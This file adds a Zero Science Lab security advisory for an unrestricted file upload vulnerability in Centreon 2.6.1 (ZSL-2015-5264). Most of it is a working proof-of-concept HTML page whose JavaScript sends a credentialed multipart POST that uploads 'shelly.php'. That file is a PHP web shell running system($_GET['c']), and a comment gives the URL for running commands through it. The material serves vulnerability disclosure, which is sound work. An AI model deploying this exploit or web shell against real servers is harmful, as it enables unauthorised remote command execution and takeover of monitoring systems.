@@ -1,0 +1,99 @@
+
+Centreon 2.6.1 Unrestricted File Upload Vulnerability
+
+
+Vendor: Centreon
+Product web page: https://www.centreon.com
+Affected version: 2.6.1 (CES 3.2)
+
+Summary: Centreon is the choice of some of the world's largest
+companies and mission-critical organizations for real-time IT
+performance monitoring and diagnostics management.
+
+Desc: The vulnerability is caused due to the improper verification
+of uploaded files via the 'filename' POST parameter. This can be
+exploited to execute arbitrary PHP code by uploading a malicious
+PHP script file that will be stored in the '/img/media/' directory.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5264
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5264.php
+
+
+10.08.2015
+
+--
+
+
+<html>
+  <!-- Specified dir is 1337 and filename is shelly.php -->
+  <!-- Ex: http://localhost.localdomain/centreon/img/media/1337/shelly.php?c=id -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost.localdomain/centreon/main.php?p=50102", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------951909060822176775828135993");
+        xhr.withCredentials = true;
+        var body = "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"directories\"\r\n" + 
+          "\r\n" + 
+          "1337\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"list_dir\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"filename\"; filename=\"shelly.php\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3c?php\r\n" + 
+          "echo \"\x3cpre\x3e\";system($_GET[\'c\']);echo \"\x3c\/pre\x3e\";\r\n" + 
+          "?\x3e\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"img_comment\"\r\n" + 
+          "\r\n" + 
+          "peened\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"action[action]\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"submitA\"\r\n" + 
+          "\r\n" + 
+          "Save\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 
+          "\r\n" + 
+          "2097152\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"img_id\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"o\"\r\n" + 
+          "\r\n" + 
+          "a\r\n" + 
+          "-----------------------------951909060822176775828135993--";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
